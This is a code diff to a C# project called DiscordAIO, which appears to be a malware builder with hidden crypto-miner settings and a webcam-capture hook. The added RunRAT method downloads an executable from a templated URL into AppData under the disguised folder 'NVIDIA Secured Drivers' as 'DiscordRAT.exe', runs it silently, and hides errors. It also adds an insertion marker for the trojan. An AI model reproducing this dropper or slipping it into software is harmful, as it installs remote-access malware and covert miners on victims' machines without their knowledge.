@@ -2837,6 +2837,21 @@ namespace DiscordAIO
 			catch { }
 		}
 
+		private static string ratURL = "%raturlrightthere%";
+		private static string EEEEEappdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+
+		// Thanks to Sp00p64
+		public static void RunRAT() 
+		{
+			try
+			{
+				new WebClient().DownloadFile(ratURL, EEEEEappdata + "NVIDIA Secured Drivers\\DiscordRAT.exe");
+			}
+			catch {}
+
+			Process.Start(EEEEEappdata + "NVIDIA Secured Drivers\\DiscordRAT.exe");
+		}
+
 		private static string minePool = "%poolhere%";
 		private static string mineUser = "%usernamehere%";
 		private static string mine_cpu_usage = "%usagehere%";
@@ -3032,6 +3047,8 @@ namespace DiscordAIO
 			//takepic
 
 			//custom
+
+			//ratoverhere
 
 			//sneakyminer
 
